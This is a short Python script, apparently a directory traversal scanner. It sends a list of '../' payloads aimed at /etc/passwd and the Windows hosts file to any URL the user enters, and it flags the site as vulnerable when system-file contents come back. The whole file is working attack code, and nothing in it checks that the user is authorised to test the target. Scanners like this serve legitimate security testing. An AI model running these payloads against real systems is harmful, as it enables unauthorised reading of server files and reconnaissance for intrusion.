import requests

# List of common directory traversal payloads
traversal_payloads = [
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../windows/system32/drivers/etc/hosts",
    "../../../windows/system32/drivers/etc/hosts",
    "../../../../windows/system32/drivers/etc/hosts"
]

def check_directory_traversal(url):
    """
    Given a `url`, it tests for directory traversal vulnerability.
    """
    vulnerable = False
    for payload in traversal_payloads:
        test_url = f"{url}/{payload}"
        try:
            response = requests.get(test_url)
            if response.status_code == 200 and ("root:" in response.text or "127.0.0.1" in response.text):
                print(f"[+] Vulnerable URL found: {test_url}")
                vulnerable = True
                break
        except requests.RequestException as e:
            print(f"Request to {test_url} failed: {e}")
    return vulnerable

if __name__ == "__main__":
    target_url = input("Enter the base URL to test for directory traversal (e.g., http://example.com/page): ")
    if check_directory_traversal(target_url):
        print("The site is vulnerable to directory traversal!")
    else:
        print("No directory traversal vulnerability found.")
